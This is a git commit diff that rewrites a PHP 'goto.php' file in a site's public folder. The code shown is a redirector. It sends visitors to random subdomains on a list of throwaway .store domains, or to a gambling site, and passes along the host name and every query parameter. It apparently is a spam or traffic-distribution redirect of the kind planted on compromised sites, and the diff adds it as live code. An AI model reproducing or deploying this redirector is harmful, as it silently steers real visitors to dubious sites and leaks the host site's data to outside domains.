b53c43169f8d08b6b6756528f744b6952430c835
Ivanio Gamazio <101927589+SuperGamazio@users.noreply.github.com>
2024-10-28 23:00:44 +0200

    Update goto.php

--- public/goto.php
+++ public/goto.php
@@ -1,20 +1,38 @@
-<?php if(isset($_GET['v3']) && $_GET['v3'] != '') {
-
-    $domains = array('gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'); 
-    $count_domains = count($domains) - 1;
+<?php
+if (isset($_GET['v3']) && $_GET['v3'] !== '') {
+    $domains = [
+        'gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 
+        'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 
+        'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 
+        'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 
+        'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'
+    ];
+    
     $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
+    $randomDomain = $domains[array_rand($domains)];
     
-    $baseURL = "https://".$uniqw.".".$domains[rand(0, $count_domains)]."?v1=".$_SERVER['HTTP_HOST'];
-    
-    $queryParams = $_GET;
-    $queryString = http_build_query($queryParams);
-    $redirectURL = $baseURL."&".$queryString;
+    $baseURL = "https://{$uniqw}.{$randomDomain}?v1=" . urlencode($_SERVER['HTTP_HOST']);
+    $queryString = http_build_query($_GET);
+    $redirectURL = $baseURL . '&' . $queryString;
 
-    header("Location: ".$redirectURL, true, 302);
+    header("Location: {$redirectURL}", true, 302);
+    exit;
+
+} elseif (isset($_GET['xurl']) && $_GET['xurl'] !== '') {
+    
+    if ($_GET['xurl'] == '1') {
+        $baseURL = "https://compass-gambling.com?v1=" . urlencode($_SERVER['HTTP_HOST']);
+        $queryString = http_build_query($_GET);
+        $redirectURL = $baseURL . '&' . $queryString;
+
+        header("Location: {$redirectURL}", true, 302);
+    } else {
+        header("Location: /404", true, 302);
+    }
     exit;
 
 } else {
-
     header("Location: /404", true, 302);
     exit;
-} ?>
+}
+?>
